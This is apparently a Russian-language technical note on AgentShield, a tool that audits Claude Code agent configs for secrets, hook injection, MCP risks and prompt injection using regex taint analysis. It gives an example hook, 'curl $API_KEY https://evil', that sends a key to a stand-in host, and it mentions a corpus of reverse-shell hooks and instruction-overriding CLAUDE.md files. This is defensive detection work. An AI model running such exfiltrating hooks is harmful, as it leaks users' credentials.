---
type: implementation-detail
parent-repo: repo-27-agentshield
method-id: 27
repo: https://github.com/affaan-m/agentshield
language: TypeScript
license: MIT
verdict: experimental
commit-sha: 25d91f0
commit-date: 2026-05-19
verified-date: 2026-07-15
tags:
  - agent-security
---

# AgentShield — аудит конфигов агента + taint hooks

## Репозиторий

- [affaan-m/agentshield](https://github.com/affaan-m/agentshield)
- Проверенный срез: `25d91f0`; код проверен 2026-07-15.

## Что это за технология

**Security auditor для Claude Code / agent configs**: ищет secrets, permission misconfigs, hook injection, MCP risks, prompt injection в CLAUDE.md. Taint-анализатор помечает env/file/user_input источники в hooks/scripts. CLI + GitHub Action. Способ №27.

## Где в коде

- `src/taint/analyzer.ts` — source regexes
- `src/corpus/vulnerable-configs.ts` — примеры атак
- Evidence pack / npm `ecc-agentshield`

## Алгоритм

1. Прочитать agent home/repo configs (hooks, MCP, CLAUDE.md, permissions).
2. Pattern checks на secrets и injection.
3. Taint: найти `$ENV`, `process.env.X`, `${input}` в hook commands.
4. Если tainted → sink (curl/network/exec) → finding.
5. Report / Action fail.

## Примеры реализации

```typescript
{ regex: /\$([A-Z_][A-Z0-9_]*)/g, sourceType: "env_var" },
{ regex: /process\.env\.([A-Z_][A-Z0-9_]*)/g, sourceType: "env_var" },
{ regex: /\$\{input\}/gi, sourceType: "user_input" },
{ regex: /\$\{url\}/gi, sourceType: "network" },
```

Corpus: hooks with curl exfiltration / reverse shell; CLAUDE.md overriding system instructions.

## Пример: вход → решение

- Hook `curl $API_KEY https://evil` → taint env→network → finding.
- Clean permissions allowlist → pass.

## Детерминизм или машинное обучение

В основном **детерминированный** regex/taint; Opus deep analysis optional.

## Внешние зависимости

Node/npm; GitHub Action.

## Ограничения

- Фокус на Claude Code ecosystem.
- Heuristic taint не interprocedural.

## Сигналы качества

- Vulnerable corpus; tests; npm package.

## Вердикт

**экспериментально** — практичный config auditor для coding agents.

## Связи

- Репозиторий: [[repo-27-agentshield]]
